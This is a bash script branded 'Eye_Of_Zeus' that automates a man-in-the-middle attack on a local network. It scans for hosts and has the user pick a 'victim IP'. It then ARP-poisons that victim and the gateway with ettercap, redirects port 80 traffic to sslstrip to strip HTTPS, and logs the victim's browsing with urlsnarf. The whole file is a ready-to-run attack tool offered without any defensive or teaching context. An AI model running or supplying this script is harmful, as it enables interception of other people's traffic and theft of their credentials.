#!/bin/bash

# Eye_Of_Zeus Banner
echo -e "\e[1;36m"
echo " ██████████                                  ███████       ██████            ███████████                            "
echo "░░███░░░░░█                                ███░░░░░███    ███░░███          ░█░░░░░░███                             "
echo " ░███  █ ░  █████ ████  ██████            ███     ░░███  ░███ ░░░           ░     ███░    ██████  █████ ████  █████ "
echo " ░██████   ░░███ ░███  ███░░███          ░███      ░███ ███████                  ███     ███░░███░░███ ░███  ███░░  "
echo " ░███░░█    ░███ ░███ ░███████           ░███      ░███ ░░░███░                 ███     ░███████  ░███ ░███ ░░█████ "
echo " ░███ ░   █ ░███ ░███ ░███░░░            ░░███     ███    ░███                ████     █░███░░░   ░███ ░███  ░░░░███"
echo " ██████████ ░░███████ ░░██████  █████████ ░░░███████░     █████     █████████ ███████████░░██████  ░░████████ ██████ "
echo "░░░░░░░░░░   ░░░░░███  ░░░░░░  ░░░░░░░░░    ░░░░░░░     ░░░░░     ░░░░░░░░░ ░░░░░░░░░░░  ░░░░░░    ░░░░░░░░ ░░░░░░  "
echo "             ███ ░███                                                                                               "
echo "            ░░██████                                                                                                "
echo "             ░░░░░░                                                                                                 "
echo -e "\e[0m"
echo -e "\e[1;36m================================================================================\e[0m"
echo -e "\e[1;36m========================  Author: arch_nexus707  ================================\e[0m"
echo -e "\e[1;36m================================================================================\e[0m"

# Get the directory where the script is located
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
NETDISCOVER_FILE="$SCRIPT_DIR/netdiscover_output.txt"
LOG_DIR="$SCRIPT_DIR/logs"

# Create log directory with proper permissions
mkdir -p "$LOG_DIR"
chmod 755 "$LOG_DIR"

# Check if running as root (we'll use sudo for specific commands instead)
if [ "$EUID" -eq 0 ]; then
    echo "It's recommended to run this script as a regular user and use sudo for specific commands."
    echo "Please run as: $0"
    exit 1
fi

# Function to display available interfaces
show_interfaces() {
    echo "Available network interfaces:"
    interfaces=($(ip link show | grep -E "^[0-9]+: (eth|wlan)" | awk -F: '{print $2}' | tr -d ' '))
    
    for i in "${!interfaces[@]}"; do
        echo "[$((i+1))] ${interfaces[$i]}"
    done
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo "No eth or wlan interfaces found!"
        exit 1
    fi
}

# Function to perform network discovery
network_discovery() {
    echo "Starting network discovery on $selected_iface for 60 seconds..."
    
    # Run netdiscover in background for 60 seconds
    echo "Running netdiscover, please wait..."
    sudo timeout 60 netdiscover -i $selected_iface -P -r ${network_cidr} | sudo tee "$NETDISCOVER_FILE" > /dev/null 2>&1
    
    # Check if netdiscover output file was created
    if [ ! -f "$NETDISCOVER_FILE" ]; then
        echo "Error: netdiscover output file not found at $NETDISCOVER_FILE"
        exit 1
    fi
    
    # Change ownership of the file to the current user
    sudo chown $(id -u):$(id -g) "$NETDISCOVER_FILE"
    
    # Extract discovered IPs
    discovered_ips=($(grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$NETDISCOVER_FILE" | sort -u | grep -v "0.0.0.0"))
    
    # Display discovered hosts
    echo "Discovered hosts on $selected_iface:"
    for i in "${!discovered_ips[@]}"; do
        # Try to get MAC address
        mac=$(grep "${discovered_ips[$i]}" "$NETDISCOVER_FILE" | awk '{print $2}' | head -1)
        echo "[$((i+1))] IP: ${discovered_ips[$i]}  MAC: $mac"
    done
    
    if [ ${#discovered_ips[@]} -eq 0 ]; then
        echo "No hosts discovered. Exiting."
        echo "Check the netdiscover output file at: $NETDISCOVER_FILE"
        exit 1
    fi
}

# Function to get gateway IP
get_gateway() {
    gateway_ip=$(ip route | grep default | grep $selected_iface | awk '{print $3}')
    if [ -z "$gateway_ip" ]; then
        echo "Could not determine gateway IP. Please enter it manually:"
        read gateway_ip
    else
        echo "Detected gateway: $gateway_ip"
    fi
}

# Function to cleanup on exit
cleanup() {
    echo ""
    echo "Cleaning up..."
    sudo iptables -t nat -F
    sudo pkill -f sslstrip
    sudo pkill -f ettercap
    sudo pkill -f urlsnarf
    echo "Cleanup complete. iptables rules flushed and processes terminated."
}

# Set trap to cleanup on script exit
trap cleanup EXIT

# Step 1: Enable IP forwarding
echo "Enabling IP forwarding..."
sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
echo "IP forwarding status: $(cat /proc/sys/net/ipv4/ip_forward)"
echo ""

# Step 2: Select interface
show_interfaces

echo "Please select an interface (1-${#interfaces[@]}):"
read iface_choice

if [[ ! $iface_choice =~ ^[0-9]+$ ]] || [ $iface_choice -lt 1 ] || [ $iface_choice -gt ${#interfaces[@]} ]; then
    echo "Invalid selection. Exiting."
    exit 1
fi

selected_iface=${interfaces[$((iface_choice-1))]}
echo "Selected interface: $selected_iface"

# Get network CIDR for scanning
network_cidr=$(ip -o -f inet addr show $selected_iface | awk '/scope global/ {print $4}')
if [ -z "$network_cidr" ]; then
    echo "Could not determine network CIDR. Please enter it manually (e.g., 192.168.1.0/24):"
    read network_cidr
fi

# Step 3: Network discovery
network_discovery

# Step 4: Select victim IP
echo "Please select a victim IP (1-${#discovered_ips[@]}):"
read victim_choice

if [[ ! $victim_choice =~ ^[0-9]+$ ]] || [ $victim_choice -lt 1 ] || [ $victim_choice -gt ${#discovered_ips[@]} ]; then
    echo "Invalid selection. Exiting."
    exit 1
fi

victim_ip=${discovered_ips[$((victim_choice-1))]}
echo "Selected victim IP: $victim_ip"

# Step 5: Get gateway IP
get_gateway

# Step 6: Set up iptables rule
echo "Setting up iptables rule..."
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Step 7: Start sslstrip in background
echo "Starting sslstrip in background..."
sudo bash -c "sslstrip -l 8080 > '$LOG_DIR/sslstrip.log' 2>&1" &
SSLSTRIP_PID=$!
echo "SSLStrip running (PID: $SSLSTRIP_PID), logging to $LOG_DIR/sslstrip.log"

# Step 8: Start ettercap in background
echo "Starting ettercap in background..."
sudo bash -c "ettercap -Tq -M arp:remote -i $selected_iface /$victim_ip// /$gateway_ip// > '$LOG_DIR/ettercap.log' 2>&1" &
ETTERCAP_PID=$!
echo "Ettercap running (PID: $ETTERCAP_PID), logging to $LOG_DIR/ettercap.log"

# Brief pause to allow ARP poisoning to take effect
sleep 5

# Step 9: Start urlsnarf in background
echo "Starting urlsnarf in background..."
sudo bash -c "urlsnarf -i $selected_iface > '$LOG_DIR/urlsnarf.log' 2>&1" &
URLSNARF_PID=$!
echo "URLSnarf running (PID: $URLSNARF_PID), logging to $LOG_DIR/urlsnarf.log"

# Change ownership of log files to current user
sudo chown $(id -u):$(id -g) "$LOG_DIR"/*.log 2>/dev/null || true

echo ""
echo "All tools have been launched in the background."
echo "Netdiscover output saved to: $NETDISCOVER_FILE"
echo "Log files are in: $LOG_DIR/"
echo ""
echo "Monitoring logs (press Ctrl+C to stop):"
echo "---------------------------------------"

# Function to monitor logs
monitor_logs() {
    # Wait a moment for logs to be created
    sleep 2
    # Change ownership of log files again in case they were created after the previous chown
    sudo chown $(id -u):$(id -g) "$LOG_DIR"/*.log 2>/dev/null || true
    
    if [ -f "$LOG_DIR/urlsnarf.log" ]; then
        tail -f "$LOG_DIR/urlsnarf.log" | while read line; do
            echo "[URL] $line"
        done
    else
        echo "Warning: URLSnarf log file not found. Monitoring ettercap log instead."
        tail -f "$LOG_DIR/ettercap.log"
    fi
}

# Monitor logs (press Ctrl+C to exit)
monitor_logs
